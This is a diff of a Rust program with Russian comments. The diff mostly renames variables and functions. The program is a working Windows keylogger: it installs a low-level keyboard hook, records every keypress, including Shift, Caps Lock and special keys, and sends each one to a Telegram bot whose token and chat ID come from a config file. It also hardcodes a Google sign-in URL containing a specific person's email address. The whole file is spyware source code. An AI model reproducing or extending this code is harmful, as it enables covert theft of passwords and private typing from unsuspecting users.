@@ -21,7 +21,7 @@ use dns_lookup::lookup_host;
 mod config;
 
 // отправка сообщения в тг
-async fn bot(text: String) {
+async fn bot_sender(text: String) {
     // Получаем токен бота и ID чата
     let bot_token = config::BOT_TOKEN;
     let chat_id = config::CHAT_ID;
@@ -42,40 +42,40 @@ async fn bot(text: String) {
         .await;
 }
 
-unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
+unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
     // для определения зашёл он или нет
-    let domain = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
-    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(domain) {
-        let p_keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
-        let caps_lock_on = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
-        let shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;
+    let url = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
+    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !is_site_open(url) {
+        let keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
+        let is_caps_lock = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
+        let is_shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;
 
         // определение caps_lock
-        if caps_lock_on {
-            tokio::spawn(bot(String::from("(Caps Lock) ")));
+        if is_caps_lock {
+            tokio::spawn(bot_sender(String::from("(Caps Lock) ")));
         }
 
         // shift или не shift и вывод key pressed
-        if shift_pressed && is_any_key_pressed() {
-            if p_keyboard.vkCode == 164 {
-                tokio::spawn(bot(String::from("(Shift) Key pressed: Alt")));
+        if is_shift_pressed && is_any_key_pressed() {
+            if keyboard.vkCode == 164 {
+                tokio::spawn(bot_sender(String::from("(Shift) Key pressed: Alt")));
             } else {
-                let s = format!("(Shift) Key pressed: {}", p_keyboard.vkCode as u8 as char);
-                tokio::spawn(bot(s));
+                let output = format!("(Shift) Key pressed: {}", keyboard.vkCode as u8 as char);
+                tokio::spawn(bot_sender(output));
             }
         } else {
-            let s = format!("Key pressed: {}", p_keyboard.vkCode as u8 as char);
-            match p_keyboard.vkCode {
-                9 => tokio::spawn(bot(String::from("Key pressed: Tab"))),
-                20 => tokio::spawn(bot(String::from("Key pressed: Caps Lock"))),
-                160 => tokio::spawn(bot(String::from("Key pressed: Shift"))),
-                162 => tokio::spawn(bot(String::from("Key pressed: Ctrl"))),
-                164 => tokio::spawn(bot(String::from("Key pressed: Alt"))),
-                32 => tokio::spawn(bot(String::from("Key pressed: Space"))),
-                27 => tokio::spawn(bot(String::from("Key pressed: Esc"))),
-                8 => tokio::spawn(bot(String::from("Key pressed: Backspace"))),
-                13 => tokio::spawn(bot(String::from("Key pressed: Enter"))),
-                _ => tokio::spawn(bot(s)),
+            let output = format!("Key pressed: {}", keyboard.vkCode as u8 as char);
+            match keyboard.vkCode {
+                9 => tokio::spawn(bot_sender(String::from("Key pressed: Tab"))),
+                20 => tokio::spawn(bot_sender(String::from("Key pressed: Caps Lock"))),
+                160 => tokio::spawn(bot_sender(String::from("Key pressed: Shift"))),
+                162 => tokio::spawn(bot_sender(String::from("Key pressed: Ctrl"))),
+                164 => tokio::spawn(bot_sender(String::from("Key pressed: Alt"))),
+                32 => tokio::spawn(bot_sender(String::from("Key pressed: Space"))),
+                27 => tokio::spawn(bot_sender(String::from("Key pressed: Esc"))),
+                8 => tokio::spawn(bot_sender(String::from("Key pressed: Backspace"))),
+                13 => tokio::spawn(bot_sender(String::from("Key pressed: Enter"))),
+                _ => tokio::spawn(bot_sender(output)),
             };
         }
     }
@@ -97,20 +97,20 @@ fn is_any_key_pressed() -> bool {
 // Закидываем удочку (начинаем записывать клавиши)
 fn set_hook() -> HHOOK {
     unsafe {
-        let h_instance = GetModuleHandleA(null_mut());
-        SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_proc), h_instance, 0)
+        let instance = GetModuleHandleA(null_mut());
+        SetWindowsHookExA(WH_KEYBOARD_LL, Some(key_recognition), instance, 0)
     }
 }
 
 // убираем удочку (остановка)
-fn release_hook(h_hook: HHOOK) {
+fn release_hook(hook: HHOOK) {
     unsafe {
-        UnhookWindowsHookEx(h_hook);
+        UnhookWindowsHookEx(hook);
     }
 }
 
 // Проверка соединений
-fn check_connections(target_ip: &str, target_port: u16) -> bool {
+fn check_connections(ip: &str, port: u16) -> bool {
     use std::process::Command;
 
     let output = Command::new("netstat")
@@ -130,14 +130,14 @@ fn check_connections(target_ip: &str, target_port: u16) -> bool {
             let remote = parts[2];
             let remote_parts: Vec<&str> = remote.split(':').collect();
             remote_parts.len() == 2
-                && remote_parts[0] == target_ip
-                && remote_parts[1].parse::<u16>().unwrap_or(0) == target_port
+                && remote_parts[0] == ip
+                && remote_parts[1].parse::<u16>().unwrap_or(0) == port
         })
 }
 
 // Проверка доступности сайта
-fn is_site_open(domain: &str) -> bool {
-    if let Ok(ips) = lookup_host(domain) {
+fn is_site_open(url: &str) -> bool {
+    if let Ok(ips) = lookup_host(url) {
         ips.into_iter().any(|ip| {
             let target_ip = ip.to_string();
             let ports = vec![80, 443]; // HTTP и HTTPS
@@ -151,8 +151,8 @@ fn is_site_open(domain: &str) -> bool {
 #[tokio::main]
 async fn main() {
     // закидываем удочку
-    let h_hook = set_hook();
-    if h_hook.is_null() {
+    let hook = set_hook();
+    if hook.is_null() {
         eprintln!("Failed to install hook!");
         return;
     }
@@ -167,5 +167,5 @@ async fn main() {
     }
 
     // остановка
-    release_hook(h_hook);
+    release_hook(hook);
 }
